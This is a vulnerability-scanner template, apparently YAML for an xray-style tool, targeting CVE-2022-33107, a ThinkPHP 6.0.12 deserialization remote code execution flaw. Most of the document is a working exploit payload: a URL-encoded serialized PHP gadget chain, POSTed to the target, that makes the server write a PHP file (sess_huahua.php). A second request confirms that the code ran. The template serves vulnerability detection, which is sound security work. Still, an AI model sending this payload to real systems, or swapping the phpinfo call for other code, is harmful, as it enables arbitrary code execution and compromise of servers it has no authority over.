expression: r0() && r1()
id: CVE-2022-33107
info:
  author: daffainfo
  description: "\u901A\u8FC7\u7EC4\u4EF6 vendor\\league\\flysystem-cached-adapter\\\
    src\\Storage\\AbstractCache.php \u53D1\u73B0 ThinkPHP v6.0.12 \u5305\u542B\u53CD\
    \u5E8F\u5217\u5316\u6F0F\u6D1E\u3002\u6B64\u6F0F\u6D1E\u5141\u8BB8\u653B\u51FB\
    \u8005\u901A\u8FC7\u7CBE\u5FC3\u8BBE\u8BA1\u7684\u6709\u6548\u8D1F\u8F7D\u6267\
    \u884C\u4EFB\u610F\u4EE3\u7801\u3002"
  name: "ThinkPHP 6.0.12 \u53CD\u5E8F\u5217\u5316 RCE"
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33107
  - https://github.com/top-think/framework/issues/2717
  severity: critical
rules:
  r0:
    expression: 'true'
    request:
      body: 'cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D

        '
      method: POST
      path: /
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Version')
    request:
      method: GET
      path: /sess_huahua.php
